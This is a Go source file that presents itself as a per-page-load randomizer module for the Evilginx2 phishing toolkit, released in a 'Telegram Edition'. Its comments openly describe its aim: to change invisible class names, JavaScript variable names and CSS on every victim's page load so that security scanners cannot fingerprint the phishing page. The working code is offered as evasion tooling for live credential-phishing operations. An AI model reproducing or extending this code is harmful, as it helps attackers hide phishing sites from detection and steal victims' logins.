// core/randomizer.go
// Per-Page-Load HTML/CSS Randomizer for Evilginx2
//
// Telegram Edition by @officialmonsterz (https://t.me/officialmonsterz)
//
// WHAT THIS DOES (baby steps):
//   Every time a victim loads your phishing page, this code automatically
//   changes tiny invisible things. The page LOOKS identical to a human eye,
//   but an automated security scanner sees a different "fingerprint" every
//   single time. This defeats:
//     - Screenshot pixel-hash detection (every load has different CSS)
//     - DOM signature detection (different class names each time)
//     - JavaScript fingerprint detection (variable names change)

package core

import (
	"fmt"
	"math/rand"
	"strings"
	"time"
)

// Randomizer handles per-page-load randomization of HTML, CSS, and JavaScript.
type Randomizer struct {
	rng *rand.Rand
}

// NewRandomizer creates a Randomizer seeded with the current system time.
// Every page load gets a completely different set of random values.
func NewRandomizer() *Randomizer {
	return &Randomizer{
		rng: rand.New(rand.NewSource(time.Now().UnixNano())),
	}
}

// RandomClassName generates a random CSS class name like "a3x_9k2m".
// Use this for injected HTML elements so scanners cannot match on fixed
// class names.
func (rz *Randomizer) RandomClassName(prefix string) string {
	const chars = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, 8)
	for i := range b {
		b[i] = chars[rz.rng.Intn(len(chars))]
	}
	return prefix + string(b)
}

// RandomVariableName generates a random JavaScript variable name like "_0x3f8a".
// Use this for injected JS so scanners cannot regex-match on variable names.
func (rz *Randomizer) RandomVariableName() string {
	const hexChars = "0123456789abcdef"
	b := make([]byte, 4)
	for i := range b {
		b[i] = hexChars[rz.rng.Intn(len(hexChars))]
	}
	return fmt.Sprintf("_0x%s", string(b))
}

// RandomizeCSS returns a random comment string to vary page fingerprints
// without touching any visual properties or layout.
func (rz *Randomizer) RandomizeCSS() string {
	return fmt.Sprintf("--rnd:%x", rz.rng.Int63())
}

// RandomizeResponseBody injects a harmless random CSS custom property into
// the HTML <head> on every load, changing the page fingerprint without
// affecting any visual layout or colors.
func (rz *Randomizer) RandomizeResponseBody(body []byte) []byte {
	if len(body) == 0 {
		return body
	}

	bodyStr := string(body)

	if strings.Contains(bodyStr, "</head>") {
		injectStyle := fmt.Sprintf("<style>:root{%s}</style>\n", rz.RandomizeCSS())
		bodyStr = strings.Replace(bodyStr, "</head>", injectStyle+"</head>", 1)
	}

	return []byte(bodyStr)
}
